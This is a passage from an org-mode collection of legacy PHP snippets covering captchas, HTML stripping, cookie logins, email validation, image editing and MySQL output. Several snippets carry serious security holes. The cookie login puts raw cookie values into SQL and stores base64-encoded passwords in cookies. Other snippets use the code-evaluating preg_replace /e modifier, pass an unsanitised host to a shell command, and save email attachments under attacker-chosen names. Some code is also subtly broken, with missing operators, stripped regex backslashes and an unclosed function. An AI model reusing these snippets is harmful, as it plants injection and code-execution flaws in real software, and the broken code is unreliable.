                                $now_y = "selected";
                        }
                }
                $year .= '<option value="'.$i.'" '.$now_y.'>'.$i.'</option>';
                $now_y = "";
        }//END year for loop
        $year .= '</select>';
        //-------------------------------------------
        ECHO $month." ".$day." ".$year;
}//END buildDate function
// ------------------------------------
FUNCTION get330Date() {
        RETURN DATE("Y-m-d", MKTIME(0, 0, 0, SUBSTR(GMDATE("Y m d"),5,2), 
        SUBSTR(GMDATE("Y m d"),8,2) + 330, 
        SUBSTR(GMDATE("Y m d"),0,4)))."<br />";
}
 
?>
#+end_src

** Calculate Distance
#+begin_src php
 <?PHP
 
FUNCTION distance($lat1, $lng1, $lat2, $lng2, $miles = TRUE)
{
     $pi80 = M_PI / 180;
     $lat1 *= $pi80;
     $lng1 *= $pi80;
     $lat2 *= $pi80;
     $lng2 *= $pi80;
 
     $r = 6372.797; // mean radius of Earth in km
     $dlat = $lat2 - $lat1;
     $dlng = $lng2 - $lng1;
     $a = SIN($dlat / 2) * SIN($dlat / 2) + COS($lat1) * COS($lat2) * SIN($dlng / 2) * SIN($dlng / 2);
     $c = 2 * ATAN2(SQRT($a), SQRT(1 - $a));
     $km = $r * $c;
 
     RETURN ($miles ? ($km * 0.621371192) : $km);
}
 
?> 
#+end_src

** captcha GD Image Library
#+begin_src php
<?PHP
// start the session to store the variable
SESSION_START();
 
// generate the random code
$chars = 'abcdefghkmnprstuvwxyzABCDEFGHJKLMNPQRSTUV2345689';
$length = 6;
$code = '';
FOR($i = 0; $i < $length; $i++){
   $pos = MT_RAND(0, STRLEN($chars)-1);
   $code .= SUBSTR($chars, $pos, 1);
}
 
// store the code to compare later
$_SESSION['captcha'] = $code;
 
// set up the image
// size
$width = 120;
$height = 30;
// colors
$r = MT_RAND(160, 255);
$g = MT_RAND(160, 255);
$b = MT_RAND(160, 255);
// create handle for new image
$image = imagecreate($width, $height);
// create color handles
$background = imagecolorallocate($image, $r, $g, $b);
$text = imagecolorallocate($image, $r-128, $g-128, $b-128);
// fill the background
imagefill($image, 0, 0, $background);
 
// add characters in random orientation
FOR($i = 1; $i <= $length; $i++){
   $counter = MT_RAND(0, 1);
   IF ($counter == 0){
      $angle = MT_RAND(0, 30);
   }
   IF ($counter == 1){
      $angle = MT_RAND(330, 360);
   }
   // "arial.ttf" can be replaced by any TTF font file stored in the same directory as the script
   imagettftext($image, MT_RAND(14, 18), $angle, ($i * 18)-8, MT_RAND(20, 25), $text, "arial.ttf", SUBSTR($code, ($i - 1), 1));
}
 
// draw a line through the text
imageline($image, 0, MT_RAND(5, $height-5), $width, MT_RAND(5, $height-5), $text);
 
// blur the image
$gaussian = ARRAY(ARRAY(1.0, 2.0, 1.0), ARRAY(2.0, 4.0, 2.0), ARRAY(1.0, 2.0, 1.0));
imageconvolution($image, $gaussian, 16, 0);
 
// add a border for looks
imagerectangle($image, 0, 0, $width - 1, $height - 1, $text);
 
// prevent caching
HEADER('Expires: Tue, 08 Oct 1991 00:00:00 GMT');
HEADER('Cache-Control: no-cache, must-revalidate');
 
// output the image
HEADER("Content-Type: image/gif");
imagegif($image);
imagedestroy($image); 
?>
 
 
 
Sample Page:
 
<?PHP SESSION_START(); ?>
<html>
<head>
<title>CATCHA Test</title>
</head>
<body>
<?PHP
IF(ISSET($_POST['captcha'])){
   IF(STRTOLOWER($_POST['captcha']) == STRTOLOWER($_SESSION['captcha'])){
      ECHO '<div>Success</div>';
   }
   ELSE{
      ECHO '<div>Incorrect</div>';
   }
}
?>
<img src="captcha.php" alt="CAPTCHA" width="120" height="30">
<form method="post">
  <input type="text" name="captcha" id="captcha">
  <input type="submit" name="submit" id="submit" value="Test">
</form>
</body>
</html>
#+end_src

** Convert HTML to plain text
#+begin_src php
<?PHP
 
// $document should contain an HTML document.
// This will remove HTML tags, javascript sections
// and white space. It will also convert some
// common HTML entities to their text equivalent.
 
$search = ARRAY ("'<script[^>]*?>.*?</script>'si",  // Strip out javascript
                 "'<[/!]*?[^<>]*?>'si",          // Strip out HTML tags
                 "'([rn])[s]+'",                // Strip out white space
                 "'&(quot|#34);'i",                // Replace HTML entities
                 "'&(amp|#38);'i",
                 "'&(lt|#60);'i",
                 "'&(gt|#62);'i",
                 "'&(nbsp|#160);'i",
                 "'&(iexcl|#161);'i",
                 "'&(cent|#162);'i",
                 "'&(pound|#163);'i",
                 "'&(copy|#169);'i",
                 "'&#(d+);'e");                    // evaluate as php
 
$replace = ARRAY ("",
                 "",
                 "\1",
                 "\"",
                 "&",
                 "<",
                 ">",
                 " ",
                 CHR(161),
                 CHR(162),
                 CHR(163),
                 CHR(169),
                 "chr(\1)");
 
$text = PREG_REPLACE($search, $replace, $document);
 
?> 
#+end_src

** Cookie Login Code
#+begin_src php
 <?PHP
 
 IF( (ISSET($_COOKIE['USERNAME_COOKIE'])) && (ISSET($_COOKIE['PASSWORD_COOKIE'])) ) {
        $qry=MYSQL_QUERY("select * from loginTblName where username='".$_COOKIE['USERNAME_COOKIE']."' and password='".$_COOKIE['PASSWORD_COOKIE']."'") or DIE(MYSQL_ERROR());
        IF(MYSQL_NUM_ROWS($qry)!=0){
                $res=MYSQL_FETCH_ARRAY($qry);
                $_SESSION["ad_id"]        =    $res["ad_id"];
                $_SESSION["name"]        =    $res["fname"]." ".$res["sname"];
                $prevkeys                =   $res["priv"];
                $_SESSION["tempSessId"]    =    SESSION_ID();
                $keys                    = "";
                $prevkeys                = EXPLODE("#",$prevkeys);
                HEADER("location:filename.php");
            }
            ELSE{
                $err="Invalid Username or Password.";
            }
    }
 
IF(ISSET($_POST["submitLogin"])){
        $qry=MYSQL_QUERY("select * from loginTblName where username='".ADDSLASHES($_POST["UserName"])."' and password='".BASE64_ENCODE($_POST["password"])."'") or DIE(MYSQL_ERROR());
        IF($_POST["signedin"]=='1'){
            $_POST['password']=BASE64_ENCODE($_POST['password']);
            $hour = TIME() + 60*60*24*30; 
            SETCOOKIE(USERNAME_COOKIE, $_POST['UserName'], $hour);
            SETCOOKIE(PASSWORD_COOKIE, $_POST['password'], $hour);    
            //print_r($_COOKIE);
        }
        IF(MYSQL_NUM_ROWS($qry)!=0){
            $res=MYSQL_FETCH_ARRAY($qry);
            $_SESSION["ad_id"]        =    $res["ad_id"];
            $_SESSION["name"]        =    $res["fname"]." ".$res["sname"];
            $prevkeys                =   $res["priv"];
            $_SESSION["tempSessId"]    =    SESSION_ID();
            HEADER("location:filename.php");
        }
        ELSE{
            $err="Invalid Username or Password.";
        }
    }
 
?>
 
<form method="post">
<table border="0" cellpadding="0" cellspacing="0">
                    <tr>
                        <td><label for="username">Username:</label></td>
                        <td><input name="UserName" id="UserName" valign="top" class="StandardForm" tabindex="1" size="30" maxsize="100"></td>
                        <td valign="top"></td>
                    </tr>
                    <tr>
                        <td><label for="password">Password:</label></td>
                        <td><input name="password" type="password" class="StandardForm" tabindex="2" size="30" maxsize="100" id="password"></td>
                        <td></div></td>
                    </tr>
                </table>
 
<label for="signedin" class="small">Keep me signed in</label><input type="checkbox" id="signedin" value="1" name="signedin" class="checked" />
            <div id="divLogin"><input type="Submit" tabindex="4" name="submitLogin" id="submitLogin" value="LOGIN" class="submit"></div>
 
</form>   
#+end_src

** Set/Get/Remove Cookies
#+begin_src php
 /* Add Cookies */ 
<?PHP 
SETCOOKIE ("TestCookie", $value); 
SETCOOKIE ("TestCookie", $value,TIME() 3600); /* expire in 1 hour */ 
SETCOOKIE ("TestCookie", $value,TIME() 3600, "/~rasmus/", ".utoronto.ca", 1); 
?> 
 
/* Remove Cookies */ 
<?PHP 
// set the expiration date to one hour ago 
SETCOOKIE ("TestCookie", "", TIME() - 3600); 
SETCOOKIE ("TestCookie", "", TIME() - 3600, "/~rasmus/", ".utoronto.ca", 1); 
?> 
 
/* Use Cookies */ 
<?PHP 
ECHO $TestCookie; 
ECHO $_COOKIE["TestCookie"]; 
?> 
 
/* Set cookie array */ 
<?PHP 
SETCOOKIE ("cookie[three]", "cookiethree"); 
SETCOOKIE ("cookie[two]", "cookietwo"); 
SETCOOKIE ("cookie[one]", "cookieone"); 
     IF (ISSET ($cookie)) { 
          WHILE (LIST ($name, $value) = EACH ($cookie)) { 
          ECHO "$name == $value<br>\n"; 
     } 
} 
?>  
#+end_src
  
** Validate email address #1
#+begin_src php
<?PHP
 
$email = "someone@example.com";
IF(EREGI("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$", $email)) {
  ECHO "Valid email address.";
}ELSE{
  ECHO "Invalid email address.";
}
 
?>
#+end_src

** Validate email address #2
#+begin_src php
<?PHP
 
FUNCTION checkEmail($email) {
     IF (EREG("^[a-zA-Z0-9][a-zA-Z0-9_\.\-]*[@][a-zA-Z0-9\.\-]*[\.][a-zA-Z]{2,4}$", $email)) {
          RETURN TRUE;
     } ELSE {
          RETURN FALSE;
     }
}
 
?>
#+end_src

** Validate email address #3
#+begin_src php
<?PHP
 
FUNCTION isValidEmail( $email = NULL ){
     RETURN PREG_MATCH( "/^
     [\d\w\/+!=#|$?%{^&}*`'~-]
     [\d\w\/\.+!=#|$?%{^&}*`'~-]*@
     [A-Z0-9]
     [A-Z0-9.-]{1,61}
     [A-Z0-9]\.
     [A-Z]{2,6}$/ix", $email );
}
 
?>
#+end_src

** EVAL a file
#+begin_src php
<?PHP
 
$str = compile('file_to_process');
$str = do_more_things_with($str);

ECHO $str;
 
FUNCTION compile($file) {
    OB_START();
    REQUIRE $file;
    RETURN OB_GET_CLEAN();
}
 
?>  
#+end_src

** Fake email addresses
#+begin_src php
<?PHP
 
// maximum emails to generate on each page
$maxemails = 50;
 
$tld = ARRAY(".com",".com",".biz",".info",".com.au",".co.uk",".sg",".cn",".fr",".de",".org",".gov",".net",".no");
SLEEP(2);
 
SRAND ((double) MICROTIME() * 1000000);
FOR ($i = 1; $i <= $maxemails; $i++) {
        $nextmail = "";
        $rnd = RAND(5,12);
        FOR ($a = 1; $a <= $rnd; $a++) {
                $tmp = RAND(97, 122);
                $nextmail .= CHR($tmp);
        }
        $fornavn = $nextmail;
        $nextmail .= "@";
        $rnd = RAND(7,12);
        FOR ($a = 1; $a <= $rnd; $a++) {
                $tmp = RAND(97, 122);
                $nextmail .= CHR($tmp);
        }
        $rnd = RAND(1,COUNT($tld));
        $nextmail .= $tld[$rnd];
        ECHO "<a href=\"mailto:$nextmail\">".$nextmail."</a><br>\n";
}
 
?>
#+end_src

** Filter Empty Array Elements

#+begin_src php
<?PHP
 
// filter empty elements
$some_array = PREG_GREP('#\S#', ARRAY_MAP('trim', $some_array));
 
?>
#+end_src

** Find IP from Hostname

#+begin_src php
<?PHP
 
$ip = RTRIM(`/usr/bin/dig $host A +short | /usr/bin/tail -1`);
 
?>
#+end_src

** Make grayscaled image

#+begin_src php
<?PHP
 
HEADER("content-type: image/jpeg");
$image = imagecreatefromjpeg("image.jpg");
imagefilter($image,IMG_FILTER_GRAYSCALE);
imagejpeg($image);
imagedestroy($image);
 
?>
#+end_src

** Auto Link Maker #2

#+begin_src php
<?PHP
 
FUNCTION linkScan($string1)
     {
     $pattern1 = "/(?<![\\/\\d\\w])(http:\\/\\/)?([\\w\\d\\-]+)
             ((\\.([\\w\\d\\-])+){2,})([\\/\\?\\w\\d\\.\\-_&=+%]*)?/i";
     $replace1 = "<a href=\\"http://$2$3$6\\" target=\\"popup\\">$0</a>";
     $string2 = PREG_REPLACE($pattern1,$replace1,$string1);
     $pattern2 = "/[\\d\\w\\.\\-_]+@[\\d\\w\\-_\\.]+?
             \\.[\\w]{2,3}(\\.[\\w]{2,3})?/i";
     $replace2 = "<a href=\\"mailto:$0\\">$0</a>";
     $string3 = PREG_REPLACE($pattern2,$replace2,$string2);     
     RETURN $string3;     
     }
 
?>
#+end_src

** get link text

#+begin_src php

<?PHP
 
FUNCTION getUrlLinkText($url){
 
    PREG_MATCH('/\>(.*)<\/a>/', $url, $matches);
    /*** return the match ***/
    RETURN $matches[1];
}
 
/* example usage 
 
$url = '<a href="http://www.domain.com" class="something" id="link_id">Url Text Link Here</a>';
echo getUrlLinkText($url);
 
*/
 
?>
#+end_src

** Get text between tags

#+begin_src php
<?PHP
 
$str = " 
Line 1: This is a string 
Line 2: <pre>This is something within a pre-formatted section 
spanning 2+ lines. 
The end.</pre> Should not be included. 
Line 3: End of test string."; 
 
PREG_MATCH("|<pre>(.+)</pre>|si", $str, $m); 
ECHO NL2BR($m[1]); 
 
?> 
#+end_src

** Googlebot monitor
  
#+begin_src php
<?PHP
 
IF(EREGI("googlebot",$_SERVER['HTTP_USER_AGENT'])) {
  $s = "";
  FOREACH($_SERVER AS $item => $value) {
    $s .= "\n$item : $value";
  }
  $sdate = DATE("Y-m-d h:i:s");
  $message = <<<MESSAGE
Visit date:$sdate
Information:
=================================
$s
=================================
MESSAGE;
  IF($google_alert) {
    MAIL("youremail@yourdomain.com", "googlebot alert", $message);
  }
}
 
?>
#+end_src

** HEX Encode / Decode

#+begin_src php
<?PHP
 
   $text = "PHP rocks!";
   $encoded = PREG_REPLACE(
           "'(.)'e"
         ,"dechex(ord('\\1'))"
         ,$text
   );
   PRINT "ENCODED: $encoded\n";
 
?>
 
ENCODED: 50485020726f636b7321
 
<?PHP
 
   PRINT "DECODED: ".PREG_REPLACE(
       "'([\S,\d]{2})'e"
     ,"chr(hexdec('\\1'))"
     ,$encoded)."\n";
 
?>
 
DECODED: PHP rocks!
#+end_src

** HEX to RGB array

#+begin_src php
<?PHP
 
FUNCTION hex2dec($hex) {
  $color = STR_REPLACE('#', '', $hex);
  $ret = ARRAY(
   'r' => HEXDEC(SUBSTR($color, 0, 2)),
   'g' => HEXDEC(SUBSTR($color, 2, 2)),
   'b' => HEXDEC(SUBSTR($color, 4, 2))
  );
  RETURN $ret;
}
 
?>
#+end_src

** Perfect Highlighting Function

#+begin_src php
<?PHP
// highlight words in a string 
FUNCTION highlight($text, $search) {
   $text = PREG_REPLACE( "/(^|\s|,!|;)(".PREG_QUOTE($search, "/").")(\s|,|!|&|$)/i", "\\1<span class='hlstyle'>\\2</span>\\3", $text );
   RETURN $text;
}
 
?>
#+end_src

** Highlight Words #2

#+begin_src php
<?PHP
 
FUNCTION highlight($haystack,$needle){
   $haystack=PREG_REPLACE("/($needle)/i","<span style='font-weight:bold'>\${1}</span>",$haystack);
   RETURN $haystack;
}
 
?>
#+end_src

** Strip HTML to Text

#+begin_src php
<?PHP
 
FUNCTION html2text($html){
    $tags = ARRAY (
    0 => '~<h[123][^>]+>~si',
    1 => '~<h[456][^>]+>~si',
    2 => '~<table[^>]+>~si',
    3 => '~<tr[^>]+>~si',
    4 => '~<li[^>]+>~si',
    5 => '~<br[^>]+>~si',
    6 => '~<p[^>]+>~si',
    7 => '~<div[^>]+>~si',
    );
    $html = PREG_REPLACE($tags,"\n",$html);
    $html = PREG_REPLACE('~</t(d|h)>\s*<t(d|h)[^>]+>~si',' - ',$html);
    $html = PREG_REPLACE('~<[^>]+>~s','',$html);
    // reducing spaces
    $html = PREG_REPLACE('~ +~s',' ',$html);
    $html = PREG_REPLACE('~^\s+~m','',$html);
    $html = PREG_REPLACE('~\s+$~m','',$html);
    // reducing newlines
    $html = PREG_REPLACE('~\n+~s',"\n",$html);
    RETURN $html;
}
 
?>
#+end_src

** Improved Strip_Tags()

#+begin_src php
<?PHP
 
FUNCTION strip_tags_in_big_string($textstring){
WHILE($textstring != STRIP_TAGS($textstring))
   {
   WHILE (STRLEN($textstring) != 0)
         {
         IF (STRLEN($textstring) > 1024) {
             $otherlen = 1024;
         } ELSE {
             $otherlen = STRLEN($textstring);
         }
         $temptext = STRIP_TAGS(SUBSTR($textstring,0,$otherlen));
         $safetext .= $temptext;
         $textstring = SUBSTR_REPLACE($textstring,'',0,$otherlen);
         } 
   $textstring = $safetext;
   }
RETURN $textstring;
 
?>
#+end_src

** Insert Into Middle Of Text

#+begin_src php
<?PHP
 
// find the middle
$full_size = STRLEN($art_text);
$halfway_mark = ($full_size / 2);
 
// clip off the first half
$firsthalf = SUBSTR($art_text, 0, $halfway_mark);
 
// find the last '<br>' in the first half
$end_mark = STRRPOS($firsthalf, '<br>');
 
// add in the adblob at the position found above
$art_text = SUBSTR($art_text, 0, $end_mark) . "<p> $ADBLOB <p>" . SUBSTR($art_text, $end_mark); 
 
?>
#+end_src

** Invert Hex Color
#+begin_src php
<?PHP
 
FUNCTION inverseHex( $color )
{
     $color       = TRIM($color);
     $prependHash = FALSE;
 
     IF(STRPOS($color,'#')!==FALSE) {
          $prependHash = TRUE;
          $color       = STR_REPLACE('#',NULL,$color);
     }
 
     SWITCH($len=STRLEN($color)) {
          CASE 3:
               $color=PREG_REPLACE("/(.)(.)(.)/","\\1\\1\\2\\2\\3\\3",$color);
          CASE 6:
               BREAK;
          DEFAULT:
               TRIGGER_ERROR("Invalid hex length ($len). Must be (3) or (6)", E_USER_ERROR);
     }
 
     IF(!PREG_MATCH('/[a-f0-9]{6}/i',$color)) {
          $color = HTMLENTITIES($color);
          TRIGGER_ERROR( "Invalid hex string #$color", E_USER_ERROR );
     }
 
     $r = DECHEX(255-HEXDEC(SUBSTR($color,0,2)));
     $r = (STRLEN($r)>1)?$r:'0'.$r;
     $g = DECHEX(255-HEXDEC(SUBSTR($color,2,2)));
     $g = (STRLEN($g)>1)?$g:'0'.$g;
     $b = DECHEX(255-HEXDEC(SUBSTR($color,4,2)));
     $b = (STRLEN($b)>1)?$b:'0'.$b;
 
     RETURN ($prependHash?'#':NULL).$r.$g.$b;
}
 
// Demo
// echo inverseHex('#000000'); // #ffffff
?>
#+end_src

** Invert Hex Color #2
#+begin_src php
<?PHP
 
// precond: $color is a hex integer
// postcond: returns inversion
FUNCTION InvertColor($color){
  RETURN (int) 0xffffff - $color;
}
 
?>
#+end_src

** Live validation of email address
#+begin_src php
<?PHP
 
FUNCTION check_email($email){
   IF(@EREG("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$", $email)){
 
       $url = SUBSTR(STRRCHR($email, "@"), 1);
       IF (STRSTR($url, "/")) {
           $url = EXPLODE("/", $url, 2);
           $url[1] = "/".$url[1];
       } ELSE {
           $url = ARRAY($url, "/");
       }
       $fh = @FSOCKOPEN($url[0], 80);
       IF ($fh) {
           @FPUTS($fh,"GET ".$url[1]." HTTP/1.1\nHost:".$url[0]."\n\n");
           IF (@FREAD($fh, 22) == "HTTP/1.1 404 Not Found") { RETURN FALSE; }
           ELSE { RETURN TRUE;    }
       } ELSE { RETURN FALSE;}
   }ELSE{
       RETURN FALSE;
   }
}
 
?>
#+end_src

** Nice 'Read More...' links
#+begin_src php
<?PHP
 
ECHO SUBSTR($entry['content'],0,STRPOS($entry['content'],".",200)+1)." <a href=\"your-link\">read more</a></p>\n";
 
?>
#+end_src

** Output as Word Doc format
#+begin_src php
<?PHP
 
$query = "SELECT * FROM TABLE  WHERE data = '$data'";
 
    $result = MYSQL_QUERY($query);
    $count = MYSQL_NUM_FIELDS($result); 
 
    FOR ($i = 0; $i < $count; $i++){ 
        IF (ISSET($header)) 
            $header .= MYSQL_FIELD_NAME($result, $i)."\t"; 
            ELSE 
                $header = MYSQL_FIELD_NAME($result, $i)."\t"; 
        } 
 
    WHILE ($row = MYSQL_FETCH_ROW($result)){ 
        $line = ''; 
 
        FOREACH ($row AS $value) 
            { 
            IF (!ISSET($value) || $value == '') 
                $value = "\t"; 
                ELSE 
                    { 
                    $value = STR_REPLACE('"', '""', $value); 
                    $value = '"'.$value.'"'."\t"; 
                    } 
 
            $line .= $value; 
            } 
 
        IF (ISSET($data)) 
            $data .= TRIM($line)."\n"; 
            ELSE 
                $data = TRIM($line)."\n"; 
        } 
 
    $data = STR_REPLACE("\r", "", $data); 
 
    IF ($data == '') 
        $data = "\nno matching records\n"; 
 
    HEADER("Content-Type: application/vnd.ms-word; name='word'"); 
    HEADER("Content-type: application/octet-stream"); 
    HEADER("Content-Disposition: attachment; filename=filename_here.doc"); 
    HEADER("Cache-Control: must-revalidate, post-check=0, pre-check=0"); 
    HEADER("Pragma: no-cache"); 
    HEADER("Expires: 0"); 
 
    ECHO $header."\n".$data; 
    EXIT;
 
?> 
#+end_src

** Pronouncable password generator
#+begin_src php
<?PHP
 
FUNCTION generatePassword($length=9, $strength=0) {
    $vowels = 'aeuy';
    $consonants = 'bdghjmnpqrstvz';
    IF ($strength & 1) {
        $consonants .= 'BDGHJLMNPQRSTVWXZ';
    }
    IF ($strength & 2) {
        $vowels .= "AEUY";
    }
    IF ($strength & 4) {
        $consonants .= '23456789';
    }
    IF ($strength & 8) {
        $consonants .= '@#$%';
    }
 
    $password = '';
    $alt = TIME() % 2;
    FOR ($i = 0; $i < $length; $i++) {
        IF ($alt == 1) {
            $password .= $consonants[(RAND() % STRLEN($consonants))];
            $alt = 0;
        } ELSE {
            $password .= $vowels[(RAND() % STRLEN($vowels))];
            $alt = 1;
        }
    }
    RETURN $password;
}
 
?>
#+end_src

** Automatically process email
#+begin_src php
 <?PHP
 
/*
Prerequisites:
Linux/BSD
PHP with CLI enabled
PEAR
Sendmail with individual user account
 
Aim: Save attachments to server storage.
 
1. Setup sendmail account to forward to PHP script.
 
In the home directory (/home/user) on the foo.bar machine make 
and edit a file called ".forward". In this file put in the 
following.
 
|"/dir_to_php_script/process.php"
 
This will forward any email sent to user@foo.bar.com to the 
php script.
 
2. PHP script to process email "/dir_to_php_script/process.php"
[Don't forget to chmod 755 process.php]
 
*/
 
// begin contents of process.php
#!/usr/local/bin/php
<?PHP
// Need PEAR installed
INCLUDE('Mail.php');
INCLUDE('Mail/mime.php');
REQUIRE_ONCE 'Mail/mimeDecode.php';
 
// read email using stdin
$fd = FOPEN("php://stdin", "r");
$email = "";
WHILE (!FEOF($fd)) {
        $email .= FREAD($fd, 1024);
}
FCLOSE($fd);
 
$params['include_bodies'] = TRUE;
$params['decode_bodies']  = TRUE;
$params['decode_headers'] = TRUE;
 
$message=NEW Mail_mimeDecode($email);
$mailObj=$message->decode($params);
 
// Who is it from
$from=$mailObj->headers['from'];
// Get Subject
$subj=$mailObj->headers['subject'];
// Get Message Body
$body=$mailObj->parts[0]->body;
$gather="From:$from\nSubject:$subj\nBody:$body";
 
 
// Get and Save the Attachments
FOREACH($mailObj->parts AS $key=>$val):
        $tmpObj=$mailObj->parts[$key];
        $tmp=$tmpObj->d_parameters['filename'];
        IF(!EMPTY($tmp)):
                $fd = FOPEN($tmp, 'w');
                FWRITE($fd, $tmpObj->body);
        ENDIF;
 
} //endforeach;
 
// end of contents of process.php
?>
 
//Posted by Christian in Php at 07:04 
#+end_src

** Prompt user at command line
#+begin_src php
<?PHP
 
ECHO "Give me your name: ";
$data = FOPEN("php://stdin", "rb");
 
WHILE (1==1) {
   $chunk = FREAD($data, 1);
   IF ($chunk == "\n" || $chunk == "\r") BREAK;
   $input .= $chunk;
}
FCLOSE($data);
 
ECHO "Hello $input!\n";
 
?>
#+end_src

** Protect Writable Directory

Use this in writeable directories in .htaccess. 
This prevents execution of php files but allows everything else.

#+begin_src
<Files ~ "\.(php)$">
order deny,allow
allow from <my ip address>
deny from all
</Files>
#+end_src

** Random Pronounceable Passwords
#+begin_src php
<?PHP
 
FUNCTION auth_pwgen(){
  $pw = '';
  $c  = 'bcdfghjklmnprstvwz'; //consonants except hard to speak ones
  $v  = 'aeiou';              //vowels
  $a  = $c.$v;                //both
 
  //use two syllables...
  FOR($i=0;$i < 2; $i++){
    $pw .= $c[RAND(0, STRLEN($c)-1)];
    $pw .= $v[RAND(0, STRLEN($v)-1)];
    $pw .= $a[RAND(0, STRLEN($a)-1)];
  }
  //... and add a nice number
  $pw .= RAND(10,99);
 
  RETURN $pw;
}
 
?>
#+end_src

** Unique Array function
Similar to array_unique(), but implemented manually

#+begin_src php
<?PHP
 
FUNCTION uniqueArray($array)
{
// Get unique elts as keys in assoc. array
FOR ($i=0,$n=COUNT($array, 1);$i<$n;$i++)
     $u_array[$array[$i]] = 1;
 
// Copy keys only into another array
RESET($u_array, 1);
FOR ($i=0,$n=COUNT($u_array, 1);$i<$n;$i++) {
     $unduplicated_array[] = KEY($u_array, 1);
     NEXT($u_array, 1);
}
RETURN $unduplicated_array;
}
 
?>
#+end_src

** Remove extra linebreaks
#+begin_src php
<?PHP
 
$string = PREG_REPLACE('/(\r?\n){2,}/', "\n\n", $string);  
 
?>
#+end_src

** Show mySQL table as HTML
#+begin_src php
<?PHP
 
$table = 'spheres';
 
IF (!MYSQL_CONNECT($db_host, $db_user, $db_pwd))
    DIE("Can't connect to database");
 
IF (!MYSQL_SELECT_DB($database)) DIE("Can't select database");
 
// sending query
$result = MYSQL_QUERY("SELECT * FROM {$table}");
IF (!$result) {
    DIE("Query to show fields from table failed");
}
 
$fields_num = MYSQL_NUM_FIELDS($result);
 
ECHO "<h1>Table: {$table}</h1>";
ECHO "<table border='1'><tr>";
// printing table headers
FOR($i=0; $i<$fields_num; $i++)
{
    $field = MYSQL_FETCH_FIELD($result);
    ECHO "<td>{$field->name}</td>";
}
ECHO "</tr>\n";
// printing table rows
WHILE($row = MYSQL_FETCH_ROW($result))
{
    ECHO "<tr>";
 
    // $row is array... foreach( .. ) puts every element
    // of $row to $cell variable
    FOREACH($row AS $cell)
        ECHO "<td>$cell</td>";
 
    ECHO "</tr>\n";
}
MYSQL_FREE_RESULT($result);
 
?>
#+end_src

** Split all chars in string
#+begin_src php
<?PHP
 
// Make the function
FUNCTION Split_String($String) {
    // Get the String Length
    $STR_LEN = STRLEN($String);
 
    // To prevent notice errors
    $New_String = "";
 
    // Loop for each character
    FOR ($i = 0; $i < $STR_LEN; $i++) {
        // Set it to a variable, you can also echo it...
        $New_String .= $String{$i} . "<br />";
    }
 
    // Return the new variable
    RETURN $New_String;
}
 
// Set the text to be split
$text = "test test test lol...";
 
// Echo the outputs of what the function does
ECHO Split_String($text);
 
?> 
#+end_src

** Split URL into parts #1
#+begin_src php
<?PHP
 
$fullurl = "http://www.domain.com/cgi-bin/printurl.cgi?url=http://test.com&email=foobar@reserved.com";
 
ECHO "The full URL: " . $fullurl . "<br><br>\n";
 
$fullurl = EREGI_REPLACE("http://", "", $fullurl);
ECHO "The full URL without http: " . $fullurl . "<br><br>\n";
 
$request_part =  STRISTR($fullurl, "/");
ECHO "The request part: " . $request_part . "<br><br>\n";
 
$main_url = SUBSTR($fullurl, 0, STRPOS($fullurl, "/"));
ECHO "The domain only: $main_url";
 
?>
#+end_src

** Truncate Links Over X Chars long
#+begin_src php
<?PHP
 
FUNCTION handle_url_tag($url, $link = ''){
     GLOBAL $FORUM_user;
 
     // maximum link length
     $MAXLEN = 50;
 
     // if too long, clip it to how many chars?
     $CLIPTO = 45;
 
     $full_url = STR_REPLACE(ARRAY(' ', '\'', '`', '"'), array('%20', '', '', ''), $url);
     if (strpos($url, 'www.') === 0)               // If it starts with www, we add http://
          $full_url = 'http://'.$full_url;
     else if (strpos($url, 'ftp.') === 0)     // Else if it starts with ftp, we add ftp://
          $full_url = 'ftp://'.$full_url;
     else if (!preg_match('#^([a-z0-9]{3,6})://#', $url, $bah))      // Else if it doesn't start with abcdef://, we add http://
          $full_url = 'http://'.$full_url;
 
     // Ok, not very pretty :-)
     $link = ($link == '' || $link == $url) ? ((strlen($url) > $MAXLEN) ? substr($url, 0 , $CLIPTO).' … '.substr($url, -10) : $url) : stripslashes($link);
 
     return '<a href="'.$full_url.'">'.$link.'</a>';
}
 
?>
#+end_src

** Use SendMail
#+begin_src php
<?PHP
 
$fd = POPEN("/usr/sbin/sendmail -t","w");
   FPUTS($fd, "To: myaddress@domain.tld ");
   FPUTS($fd, "From: Me ");
   FPUTS($fd, "Subject: Test message from my web site ");
   FPUTS($fd, "X-Mailer: PHP3 ");
   FPUTS($fd, "Testing. ");
PCLOSE($fd);
 
?>
#+end_src

** Write text onto an image
#+begin_src php
<?PHP
 
// load the image from the file specified:
$im = imagecreatefrompng("image.png");
// if there's an error, stop processing the page:
IF(!$im)
{
DIE("");
}
 
// define some colours to use with the image
$yellow = imagecolorallocate($im, 255, 255, 0);
$black = imagecolorallocate($im, 0, 0, 0);
 
// get the width and the height of the image
$width = imagesx($im);
$height = imagesy($im);
 
// draw a black rectangle across the bottom, say, 20 pixels of the image:
imagefilledrectangle($im, 0, ($height-20) , $width, $height, $black);
 
// now we want to write in the centre of the rectangle:
$font = 4; // store the int ID of the system font we're using in $font
$text = "vdhri.net"; // store the text we're going to write in $text
// calculate the left position of the text:
$leftTextPos = ( $width - imagefontwidth($font)*STRLEN($text) )/2;
// finally, write the string:
imagestring($im, $font, $leftTextPos, $height-18, $text, $yellow);
 
// output the image
// tell the browser what we're sending it
HEADER('Content-type: image/png');
// output the image as a png
imagepng($im);
 
// tidy up
imagedestroy($im);
 
?>
#+end_src

** PHP to JavaScript Array
#+begin_src php
 <?PHP
 
/*
 * Converts a PHP array to a JavaScript array
 *
 * Takes a PHP array, and returns a string formated as a 
 * JavaScript array that exactly matches the PHP array.
 *
 * @param       array  $phpArray  The PHP array
 * @param       string $jsArrayName   The name for the JavaScript array
 * @return      string
 */
 
FUNCTION get_javascript_array($phpArray, $jsArrayName, &$html = '') {
        $html .= $jsArrayName . " = new Array(); \r\n ";
        FOREACH ($phpArray AS $key => $value) {
                $outKey = (IS_INT($key)) ? '[' . $key . ']' : "['" . $key . "']";
 
                IF (IS_ARRAY($value)) {
                        get_javascript_array($value, $jsArrayName . $outKey, $html);
                        CONTINUE;
                }
                $html .= $jsArrayName . $outKey . " = ";
                IF (IS_STRING($value)) {
                        $html .= "'" . $value . "'; \r\n ";
                } ELSE IF ($value === FALSE) {
                        $html .= "false; \r\n";
                } ELSE IF ($value === NULL) {
